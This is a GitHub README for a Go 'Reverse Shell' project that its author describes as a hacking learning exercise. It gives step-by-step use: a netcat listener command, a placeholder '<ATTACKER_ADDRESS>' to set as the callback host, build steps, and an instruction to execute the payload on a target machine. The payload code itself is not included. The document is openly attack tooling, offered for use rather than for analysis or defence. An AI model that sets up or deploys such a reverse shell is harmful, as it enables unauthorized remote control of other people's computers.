<h1 align="center">Reverse Shell</h1>

<p align="center">
  <img alt="Github top language" src="https://img.shields.io/github/go-mod/go-version/Axselll/reverse-shell">

  <img alt="Github language count" src="https://img.shields.io/github/languages/count/Axselll/reverse-shell">

  <img alt="Repository size" src="https://img.shields.io/github/repo-size/Axselll/reverse-shell">

  <!-- <img alt="Github issues" src="https://img.shields.io/github/issues/{{YOUR_GITHUB_USERNAME}}/go-rest?color=56BEB8" /> -->

  <!-- <img alt="Github forks" src="https://img.shields.io/github/forks/{{YOUR_GITHUB_USERNAME}}/go-rest?color=56BEB8" /> -->

  <!-- <img alt="Github stars" src="https://img.shields.io/github/stars/{{YOUR_GITHUB_USERNAME}}/go-rest?color=56BEB8" /> -->
</p>

<!-- Status -->

<h4 align="center"> 
	🚧  Reverse Shell 🚀  Is Under construction...  🚧
</h4> 

<hr>

<p align="center">
  <a href="#dart-about">About</a> &#xa0; | &#xa0; 
  <a href="#sparkles-features">Features</a> &#xa0; | &#xa0;
  <a href="#rocket-technologies">Technologies</a> &#xa0; | &#xa0;
  <a href="#white_check_mark-requirements">Requirements</a> &#xa0; | &#xa0;
  <a href="#checkered_flag-starting">Starting</a> &#xa0; | &#xa0;
  <a href="#memo-tested-on-os">Test</a> &#xa0; | &#xa0;
  <a href="https://github.com/Axselll" target="_blank">Author</a>
</p>

<br>

## :dart: About ##

This project is for learn hacking purposes. Have not tested it on windows machine because i'm lazy

## :sparkles: Features ##

:heavy_check_mark: Custom Reverse Shell Payload


## :rocket: Technologies ##

The following tools were used in this project:

- [Go](https://go.dev/)


## :white_check_mark: Requirements ##

Before starting :checkered_flag:, you need to have [Git](https://git-scm.com), [Go](https://go.dev/), [Netcat](https://sectools.org/tool/netcat/) installed & some basic networking.

## :checkered_flag: Starting ##

### Start Netcat listener ###
```bash
nc -nlvp 8888
```

### Clone this project ####
```bash
git clone https://github.com/Axselll/reverse-shell
```

### Access ###
```bash
cd reverse-shell
```

### Install dependencies ###
```bash
go get
```

### Change <ATTACKER_ADDRESS> to your receiving netcat address ###
```bash
srcAddress := "<ATTACKER_ADDRESS>"
```

### Build ###
```bash
go build
```
### Execute the payload from your target machine, how? good luck finding that out ###


## :memo: Tested on OS ##
- [x] Linux
- []  Windows
- [] MacOS/ARM <- Just forget about this, i never have a mac

<br>
Made with :heart: by <a href="https://github.com/{{Axselll}}" target="_blank">Axselll</a>

&#xa0;

<a href="#top">Back to top</a>